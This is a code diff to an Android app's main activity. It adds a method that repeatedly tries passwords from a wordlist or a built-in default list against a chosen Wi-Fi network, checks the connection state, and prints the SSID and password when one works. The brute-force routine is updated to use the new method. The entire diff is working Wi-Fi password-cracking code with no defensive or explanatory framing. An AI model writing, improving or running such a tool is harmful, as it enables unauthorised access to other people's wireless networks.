@@ -57,6 +57,66 @@ public class MainActivity extends AppCompatActivity {
             errorView.append(res);
         }
 
+        boolean connectToUnknownB(WifiManager wifi, String ssid, String pass, boolean silent) throws InterruptedException {
+            TextView errorView = (TextView) findViewById(R.id.errorV);
+            wifi.setWifiEnabled(true);
+
+            boolean isGood = false;
+            WifiConfiguration wifiConf = new WifiConfiguration();
+            wifiConf.SSID = ("\"" + ssid + "\"");
+            if(!pass.equals(""))
+                wifiConf.preSharedKey = ("\"" + pass + "\"");
+            publishProgress("Trying pass: " + ("\"" + pass + "\"\r\n"));
+            int res = wifi.addNetwork(wifiConf);
+            if (!silent)
+                publishProgress("add Network returned " + res + "\r\n");
+            ///*
+            wifi.disconnect();
+            wifi.enableNetwork(res, true);
+            wifi.reconnect();
+
+            Thread.sleep(300);
+            WifiInfo winf = wifi.getConnectionInfo();
+            SupplicantState state;
+            state = winf.getSupplicantState();
+
+            if (state == SupplicantState.ASSOCIATING ||
+                    state == SupplicantState.AUTHENTICATING ||
+                    state == SupplicantState.GROUP_HANDSHAKE ||
+                    state == SupplicantState.FOUR_WAY_HANDSHAKE ||
+                    state == SupplicantState.SCANNING) {
+                publishProgress("waiting\r\n");
+                Thread.sleep(200);
+            }
+            Thread.sleep(200);
+            if (state == SupplicantState.INVALID ||
+                    state == SupplicantState.DISCONNECTED ||
+                    state == SupplicantState.INACTIVE ||
+                    state == SupplicantState.INTERFACE_DISABLED ||
+                    state == SupplicantState.UNINITIALIZED ||
+                    state == SupplicantState.ASSOCIATED ||
+                    state == SupplicantState.DORMANT) {
+                publishProgress("invalid\r\n");
+                isGood = false;
+            }
+
+            if (state == SupplicantState.COMPLETED) {//COMPLETED - good
+                publishProgress("Connected!\r\n");
+                publishProgress(state.toString() + "\r\n");
+                isGood = true;
+            }
+            //*/
+            if (isGood){//connectToKnownWiFi(wifi, ssid, false)) {
+                publishProgress("SSID: " + ssid + "\r\n");
+                publishProgress("Password: " + pass + "\r\n");
+                return true;
+            } else {
+                wifi.removeNetwork(res);
+                return false;
+            }
+        }
+
+
         protected boolean bruteWifi() throws InterruptedException {
             WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
             wifi.setWifiEnabled(true);
@@ -85,7 +145,7 @@ public class MainActivity extends AppCompatActivity {
                 if(spliter.equals("") || spliter == null) {//if spliter null - work
                     publishProgress("Spliter is emply!\r\nSpliting by new string\r\n");
                     while ((line = br.readLine()) != null) {
-                        res = connectToUnknown(wifi, ssid, line.trim(), true);
+                        res = connectToUnknownB(wifi, ssid, line.trim(), true);
                         if (res)
                             return true;
                     }
@@ -105,7 +165,7 @@ public class MainActivity extends AppCompatActivity {
             } finally {
                 if(readFromDefault) {
                     for (String i : DefaultPassList) {
-                        res = connectToUnknown(wifi, ssid, i, true);
+                        res = connectToUnknownB(wifi, ssid, i, true);
                         if (res) {
                             publishProgress("Password: " + i + "\r\n");
                             return true;
@@ -113,7 +173,7 @@ public class MainActivity extends AppCompatActivity {
                     }
                 } else {
                     for (String i : FilePassList) {
-                        res = connectToUnknown(wifi, ssid, i, true);
+                        res = connectToUnknownB(wifi, ssid, i, true);
                         if (res) {
                             publishProgress("Password: " + i + "\r\n");
                             return true;
